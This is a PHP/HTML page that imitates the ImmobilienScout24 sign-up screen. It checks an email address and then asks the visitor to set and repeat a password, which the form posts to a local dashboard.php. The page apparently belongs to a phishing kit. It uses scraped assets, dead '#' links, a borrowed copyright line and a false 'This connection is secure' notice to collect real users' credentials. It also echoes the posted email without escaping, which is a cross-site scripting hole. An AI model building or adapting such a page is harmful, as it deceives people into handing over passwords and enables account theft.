<?php
session_start();
if (isset($_POST['submit'])){
  if (empty($_POST['email']))
  { 
    $_SESSION['error'] = "Enter email address";
    header("location: index.php");
  } 
  else 
  {
    $_POST['email'] = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL); 
    if (filter_var($_POST['email'], FILTER_VALIDATE_EMAIL)){ 
      header("location: second_page.php");
    } 
    else 
    {
      $_SESSION['error'] = "Enter a valid email address";
      header("location: index.php");
    }
  }
 }
?>
<?php

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - ImmobilienScout24</title>
    <link rel="stylesheet" type="text/css" href="css/core.min.css">
    <link rel="stylesheet" type="text/css" href="css/bootstrap-tooltip.min.css">
    <link rel="stylesheet" type="text/css" href="css/is24-font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="css/s24-icons.css">
    <link rel="stylesheet" type="text/css" href="css/sso.min.css">
    <link rel="stylesheet" type="text/css" href="css/s24-icons.woff2">
    <link type="text/css" rel="stylesheet" charset="UTF-8" href="css/m=el_main.css">
    <link rel="icon" type="image/png" sizes="32x32" href="image/favicon-32x32.png">
</head>
<body class="height-full grid-flex flex-flow-column" data-theme="cosma" >
    <header>
        <cms-include fragment="/content/is24/deu/www/de/utils/header-footer/header/white/_jcr_content/menu.syndicate.html">

          <div data-theme="cosma">
            <header class="page-header page-header--white page-header--white--composite page-header--white--2016 content-wrapper-container" role="banner" data-path="white">
              <div class="clearfix content-wrapper vertical-center-container" data-cms-qa="is24-cms-page-header-logo" style="position: relative;">
                <div class="float-left vertical-center-container">
                  <a href="#" class="page-header__logo vertical-center" title="ImmoScout24" aria-label="ImmoScout24">
                    <!-- <img alt="ImmoScout24" class="cosma-hide" onerror="this.src=&#39;image/logo.png&#39;;this.onerror=null;" src="image/logo.svg"> -->
                    <img alt="ImmoScout24" class="core-hide" onerror="this.src=image/immoscout24.png;this.onerror=null;" src="image/immoscout24.svg">
                  </a>
                  <span class="palm-hide page-header__brand vertical-center font-s" data-cms-qa="is24-cms-page-header-brand">
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;"> The No. 1 for real estate.</font>
                    </font>
                  </span>
                </div>
                <div class="float-right vertical-center-container"></div>
              </div>
            </header>
          </div>
        </cms-include>
    </header>
    <div class="background palm-background-white flex-grow-1 grid background-image hero-image">
        <div class="background-white border align-center sso-shadow padding-xl box-max-width box-min-height margin-vertical-xl margin-horizontal-auto grid-flex flex-flow-column palm-no-margin-vertical  palm-no-shadow palm-no-border palm-no-min-height">
          <form id="loginForm" method="post" action="dashboard.php">
            <div class="grid">
              <div class="grid-item one-sixth vertical-center-container padding-vertical-s">
                <a href="index.php" id="backLink" >
                  <img src="image/icn_arrow_left.svg">
                </a>
              </div>
              <div class="grid-item four-sixths align-center vertical-center-container">
                <h4 id="passwordEntry" class="font-light margin-bottom-xl">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">to register</font>
                  </font>
                </h4>
              </div>
            </div>
            <div></div>
            <input type="hidden" value="c088834f-f99d-4a98-8018-8baa7183975f" readonly="readonly" id="tokenMapt1693599693448" name="tokenMap[t1693599693448]">
            <div class="grid-flex flex-nowrap grid-align-center padding-top">
              <img class="grid-item padding-right-s" src="image/icn_user.svg">
              <span class="grid-item crop" id="username">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;"><?php echo $_POST['email']; ?></font>
                </font>
              </span>
            </div>
            <input type="hidden" id="registerSwitch" name="registerSwitch" value="true">
            <input type="hidden" id="email" name="email" value="<?php echo $_POST['email']; ?>">
            <input type="hidden" id="dpaVersion" name="dpaVersion" value="6">
            <input type="hidden" id="homeownerInput" name="homeowner" value="false">
            <div class="align left grid-item input-text-container padding-top" id="passwordInput">
                <label class="input-label">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">to set a password</font>
                </font>
              </label>
              <div class="grid-item absolute-reference" id="passwordInput">
                <input id="password" type="password" class="input-text one-whole grid-item password-input-toggle-hide" placeholder="at least 8 characters" autofocus="" name="password" value="" required> 
                <!-- <div id="passwordVisibilityToggle" class="font-xs absolute-content cursor-pointer password-toggle-box"><span class="password-toggle">
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;">Show</font>
                    </font>
                  </span><span class="password-toggle hide">
                    <font style="vertical-align: inherit;">
                      <font style="vertical-align: inherit;">Hide</font>
                    </font>
                  </span></div> -->
              </div>
            </div>
            <!-- <div class="grid-item one-whole" id="passwordMeter">
              <div>
                <div class="grid gutter-xs password-meter password-meter-mode-green">
                  <div class="grid-item one-third">
                    <div></div>
                  </div>
                  <div class="grid-item one-third">
                    <div></div>
                  </div>
                  <div class="grid-item one-third">
                    <div></div>
                  </div>
                </div>
                <div class="font-xs font-bold password-meter-text">
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">good</font>
                  </font>
                </div>
              </div>
            </div> -->
            <div class="align-left grid-item padding-top-s input-text-container"><label class="input-label">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">Repeat password</font>
                </font>
              </label>
              <div class="grid-item absolute-reference">
                <input id="passwordconfirm" type="password" class="input-text one-whole grid-item" placeholder="Repeat password" name="passwordconfirm" value="" required onchange="equal()"></div>
            </div>
            <div id="passwordRepeateError" class="password-repeate-error" style="color:red; font-weight:bold;">&nbsp;</div>
            <div class="grid">
              <div class="grid-item">
                <div>
                  <ul>
                    <li class="checkbox-container"><input type="checkbox" class="input-checkbox" id="dataProtectionAcceptance" name="dataProtectionAcceptance" value="true"><input type="hidden" name="_dataProtectionAcceptance" value="on"><label for="dataProtectionAcceptance" name="dataProtectionAcceptance" class="label-checkbox nine-tenths align-left" style="font-size: 13px !important; width: 94% !important;">
                        <div><span>
                            <font style="vertical-align: inherit;">
                              <font style="vertical-align: inherit;">I agree to the processing of my data as stated in the </font>
                            </font>
                          </span><a href="#" target="tracks" class="link-underline">
                            <font style="vertical-align: inherit;">
                              <font style="vertical-align: inherit;">declaration of consent </font>
                            </font>
                          </a><span>
                            <font style="vertical-align: inherit;">
                              <font style="vertical-align: inherit;">of Immobilien Scout GmbH and its </font>
                            </font>
                          </span>
                          <font style="vertical-align: inherit;"><span class="tooltip-container"><span class="tooltip-target" style="text-decoration: underline;">
                                <font style="vertical-align: inherit;">subsidiaries</font>
                              </span></span></font><span class="tooltip-container"><span class="tooltip-target" style="text-decoration: underline;">
                              <font style="vertical-align: inherit;"></font>
                            </span><span class="tooltip positioning-top font-white" style="width: 180px; left: 100%; bottom: 100%;"><b>
                                <font style="vertical-align: inherit;">
                                  <font style="vertical-align: inherit;">subsidiary company</font>
                                </font>
                              </b>
                              <ul class="list-bullet">
                                <li>
                                  <font style="vertical-align: inherit;">
                                    <font style="vertical-align: inherit;">immoverkauf24 GmbH</font>
                                  </font>
                                </li>
                                <li>
                                  <font style="vertical-align: inherit;">
                                    <font style="vertical-align: inherit;">Zenhomes GmbH</font>
                                  </font>
                                </li>
                              </ul>
                            </span></span><span>
                            <font style="vertical-align: inherit;">
                              <font style="vertical-align: inherit;">described for the purpose of personalized email advertising. </font>
                              <font style="vertical-align: inherit;">You can revoke at any time.</font>
                            </font>
                          </span>
                        </div>
                      </label></li>
                  </ul>
                </div>
              </div>
            </div>
            <div class="margin-bottom-s"></div><button id="loginOrRegistration" name="loginOrRegistration" class="button-primary one-whole margin-top-l margin-bottom-s" disabled="disabled"><span>
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">to register</font>
                </font>
              </span></button>
          </form>
          <div class="font-lightgray one-whole grid-item margin-top-auto padding-top-l">
            <div class="grid-item one-whole align-center"><img src="image/icn_lock.svg"><span class="align-top">
                <font style="vertical-align: inherit;">
                  <font style="vertical-align: inherit;">This connection is secure.</font>
                </font>
              </span></div>
          </div>
        </div>
    </div>
    <!-- footer -->
    <cms-include fragment="/content/is24/deu/www/de/utils/header-footer/footer/light/_jcr_content/footer.html">
        <footer class="page-footer main-footer" role="contentinfo" data-cms-qa="page-footer" data-path="light">
          <section class="content-wrapper padding-top-l">
            <h6>
              <font style="vertical-align: inherit;">
                <font style="vertical-align: inherit;">side information</font>
              </font>
            </h6>
            <ul class="margin-bottom-m">
              <li>
                <a href="#" title="Contact &amp; Help" aria-label="Contact &amp; Help" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Contact &amp; Help</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="#" title="imprint" aria-label="imprint" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">imprint</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="#" title="Terms &amp; Conditions &amp; Legal Notices" aria-label="Terms &amp; Conditions &amp; Legal Notices" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Terms &amp; Conditions &amp; Legal Notices</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="#" title="consumer information" aria-label="consumer information" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">consumer information</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="#" title="data protection" aria-label="data protection" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">data protection</font>
                  </font>
                </a>
              </li>
              <li>
                <a href="#" title="Security" aria-label="Security" >
                  <font style="vertical-align: inherit;">
                    <font style="vertical-align: inherit;">Security</font>
                  </font>
                </a>
              </li>
            </ul>
            <p class="build-information">
              <font style="vertical-align: inherit;">
                <font style="vertical-align: inherit;">© Copyright 1999 - 2023 Immobilien Scout GmbH</font>
              </font>
            </p>
          </section>
        </footer>
    </cms-include>
</body>
<script type="text/javascript">
  function equal() {
    if (document.getElementById('passwordconfirm').value != document.getElementById('password').value) {
      document.getElementById("passwordRepeateError").innerHTML = "Password not match";
      document.getElementById("loginOrRegistration").disabled = true;
        
    }
    else{
      document.getElementById("passwordRepeateError").innerHTML = "";
      document.getElementById("loginOrRegistration").disabled = false;
    }
    
    
}
</script>
</html>